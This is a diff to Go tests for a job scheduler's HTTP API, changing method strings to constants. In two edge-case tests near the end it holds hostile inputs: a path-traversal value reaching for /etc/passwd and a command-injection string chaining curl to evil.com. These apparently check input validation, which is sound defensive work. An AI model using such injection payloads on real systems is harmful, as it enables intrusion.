@@ -79,7 +79,7 @@ func TestHistoryEndpoint(t *testing.T) {
 	sched := &core.Scheduler{Jobs: []core.Job{job}, Logger: &stubLogger{}}
 	srv := webpkg.NewServer("", sched, nil, nil)
 
-	req := httptest.NewRequest("GET", "/api/jobs/job1/history", nil)
+	req := httptest.NewRequest(http.MethodGet, "/api/jobs/job1/history", nil)
 	w := httptest.NewRecorder()
 	httpSrv := srv.HTTPServer()
 	httpSrv.Handler.ServeHTTP(w, req)
@@ -136,7 +136,7 @@ func TestJobsEndpointWithRuntimeData(t *testing.T) {
 	srv := webpkg.NewServer("", sched, nil, nil)
 
 	// Test with live buffers
-	req := httptest.NewRequest("GET", "/api/jobs", nil)
+	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
 	rr := httptest.NewRecorder()
 	srv.HTTPServer().Handler.ServeHTTP(rr, req)
 
@@ -217,7 +217,7 @@ func TestJobsEndpointAfterBufferCleanup(t *testing.T) {
 	srv := webpkg.NewServer("", sched, nil, nil)
 
 	// Test with cleaned buffers (should use captured content)
-	req := httptest.NewRequest("GET", "/api/jobs", nil)
+	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
 	rr := httptest.NewRecorder()
 	srv.HTTPServer().Handler.ServeHTTP(rr, req)
 
@@ -287,7 +287,7 @@ func TestHistoryEndpointWithCapturedOutput(t *testing.T) {
 	sched := &core.Scheduler{Jobs: []core.Job{job}, Logger: &stubLogger{}}
 	srv := webpkg.NewServer("", sched, nil, nil)
 
-	req := httptest.NewRequest("GET", "/api/jobs/history-job/history", nil)
+	req := httptest.NewRequest(http.MethodGet, "/api/jobs/history-job/history", nil)
 	rr := httptest.NewRecorder()
 	srv.HTTPServer().Handler.ServeHTTP(rr, req)
 
@@ -335,7 +335,7 @@ func TestJobsHandlerIncludesOutput(t *testing.T) {
 	sched := &core.Scheduler{Jobs: []core.Job{job}, Logger: &stubLogger{}}
 	srv := webpkg.NewServer("", sched, nil, nil)
 
-	req := httptest.NewRequest("GET", "/api/jobs", nil)
+	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
 	w := httptest.NewRecorder()
 	httpSrv := srv.HTTPServer()
 	httpSrv.Handler.ServeHTTP(w, req)
@@ -379,7 +379,7 @@ func TestJobsHandlerOrigin(t *testing.T) {
 
 	srv := webpkg.NewServer("", sched, cfg, nil)
 
-	req := httptest.NewRequest("GET", "/api/jobs", nil)
+	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
 	w := httptest.NewRecorder()
 	httpSrv := srv.HTTPServer()
 	httpSrv.Handler.ServeHTTP(w, req)
@@ -435,7 +435,7 @@ func TestRemovedJobsHandlerOrigin(t *testing.T) {
 
 	srv := webpkg.NewServer("", sched, cfg, nil)
 
-	req := httptest.NewRequest("GET", "/api/jobs/removed", nil)
+	req := httptest.NewRequest(http.MethodGet, "/api/jobs/removed", nil)
 	w := httptest.NewRecorder()
 	httpSrv := srv.HTTPServer()
 	httpSrv.Handler.ServeHTTP(w, req)
@@ -488,7 +488,7 @@ func TestDisabledJobsHandlerOrigin(t *testing.T) {
 
 	srv := webpkg.NewServer("", sched, cfg, nil)
 
-	req := httptest.NewRequest("GET", "/api/jobs/disabled", nil)
+	req := httptest.NewRequest(http.MethodGet, "/api/jobs/disabled", nil)
 	w := httptest.NewRecorder()
 	httpSrv := srv.HTTPServer()
 	httpSrv.Handler.ServeHTTP(w, req)
@@ -530,7 +530,7 @@ func TestCreateJobTypes(t *testing.T) {
 	}
 
 	for _, c := range cases {
-		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(c.body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(c.body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -563,7 +563,7 @@ func TestRunJobHandler(t *testing.T) {
 
 	t.Run("success", func(t *testing.T) {
 		body := `{"name":"test-run-job"}`
-		req := httptest.NewRequest("POST", "/api/jobs/run", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/run", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -575,7 +575,7 @@ func TestRunJobHandler(t *testing.T) {
 
 	t.Run("invalid_json", func(t *testing.T) {
 		body := `{invalid json}`
-		req := httptest.NewRequest("POST", "/api/jobs/run", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/run", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -587,7 +587,7 @@ func TestRunJobHandler(t *testing.T) {
 
 	t.Run("job_not_found", func(t *testing.T) {
 		body := `{"name":"nonexistent-job"}`
-		req := httptest.NewRequest("POST", "/api/jobs/run", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/run", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -611,7 +611,7 @@ func TestDisableJobHandler(t *testing.T) {
 
 	t.Run("success", func(t *testing.T) {
 		body := `{"name":"test-disable-job"}`
-		req := httptest.NewRequest("POST", "/api/jobs/disable", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/disable", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -629,7 +629,7 @@ func TestDisableJobHandler(t *testing.T) {
 
 	t.Run("invalid_json", func(t *testing.T) {
 		body := `{invalid}`
-		req := httptest.NewRequest("POST", "/api/jobs/disable", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/disable", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -641,7 +641,7 @@ func TestDisableJobHandler(t *testing.T) {
 
 	t.Run("job_not_found", func(t *testing.T) {
 		body := `{"name":"nonexistent-job"}`
-		req := httptest.NewRequest("POST", "/api/jobs/disable", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/disable", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -666,7 +666,7 @@ func TestEnableJobHandler(t *testing.T) {
 
 	t.Run("success", func(t *testing.T) {
 		body := `{"name":"test-enable-job"}`
-		req := httptest.NewRequest("POST", "/api/jobs/enable", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/enable", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -683,7 +683,7 @@ func TestEnableJobHandler(t *testing.T) {
 
 	t.Run("invalid_json", func(t *testing.T) {
 		body := `{bad json}`
-		req := httptest.NewRequest("POST", "/api/jobs/enable", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/enable", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -695,7 +695,7 @@ func TestEnableJobHandler(t *testing.T) {
 
 	t.Run("job_not_found", func(t *testing.T) {
 		body := `{"name":"nonexistent-job"}`
-		req := httptest.NewRequest("POST", "/api/jobs/enable", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/enable", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -712,7 +712,7 @@ func TestHistoryHandler_NotFound(t *testing.T) {
 	httpSrv := srv.HTTPServer()
 
 	t.Run("job_not_found", func(t *testing.T) {
-		req := httptest.NewRequest("GET", "/api/jobs/nonexistent/history", nil)
+		req := httptest.NewRequest(http.MethodGet, "/api/jobs/nonexistent/history", nil)
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
 
@@ -722,7 +722,7 @@ func TestHistoryHandler_NotFound(t *testing.T) {
 	})
 
 	t.Run("invalid_path", func(t *testing.T) {
-		req := httptest.NewRequest("GET", "/api/jobs/test-job/invalid", nil)
+		req := httptest.NewRequest(http.MethodGet, "/api/jobs/test-job/invalid", nil)
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
 
@@ -768,7 +768,7 @@ func TestRegisterHealthEndpoints(t *testing.T) {
 	httpSrv := srv.HTTPServer()
 
 	t.Run("health_endpoint", func(t *testing.T) {
-		req := httptest.NewRequest("GET", "/health", nil)
+		req := httptest.NewRequest(http.MethodGet, "/health", nil)
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
 
@@ -787,7 +787,7 @@ func TestRegisterHealthEndpoints(t *testing.T) {
 	})
 
 	t.Run("healthz_endpoint", func(t *testing.T) {
-		req := httptest.NewRequest("GET", "/healthz", nil)
+		req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
 
@@ -797,7 +797,7 @@ func TestRegisterHealthEndpoints(t *testing.T) {
 	})
 
 	t.Run("ready_endpoint", func(t *testing.T) {
-		req := httptest.NewRequest("GET", "/ready", nil)
+		req := httptest.NewRequest(http.MethodGet, "/ready", nil)
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
 
@@ -808,7 +808,7 @@ func TestRegisterHealthEndpoints(t *testing.T) {
 	})
 
 	t.Run("live_endpoint", func(t *testing.T) {
-		req := httptest.NewRequest("GET", "/live", nil)
+		req := httptest.NewRequest(http.MethodGet, "/live", nil)
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
 
@@ -830,7 +830,7 @@ func TestJobFromRequest_EdgeCases(t *testing.T) {
 
 	t.Run("unknown_job_type", func(t *testing.T) {
 		body := `{"name":"test","type":"unknown","schedule":"@hourly"}`
-		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -842,7 +842,7 @@ func TestJobFromRequest_EdgeCases(t *testing.T) {
 
 	t.Run("empty_type_creates_local", func(t *testing.T) {
 		body := `{"name":"empty-type","type":"","schedule":"@hourly","command":"echo test"}`
-		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -862,7 +862,7 @@ func TestJobFromRequest_EdgeCases(t *testing.T) {
 
 	t.Run("compose_invalid_service", func(t *testing.T) {
 		body := `{"name":"comp-invalid","type":"compose","schedule":"@hourly","service":"../../../etc/passwd"}`
-		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
@@ -874,7 +874,7 @@ func TestJobFromRequest_EdgeCases(t *testing.T) {
 
 	t.Run("local_invalid_command", func(t *testing.T) {
 		body := `{"name":"local-invalid","type":"local","schedule":"@hourly","command":"echo & curl http://evil.com"}`
-		req := httptest.NewRequest("POST", "/api/jobs/create", strings.NewReader(body))
+		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(body))
 		req.Header.Set("Content-Type", "application/json")
 		w := httptest.NewRecorder()
 		httpSrv.Handler.ServeHTTP(w, req)
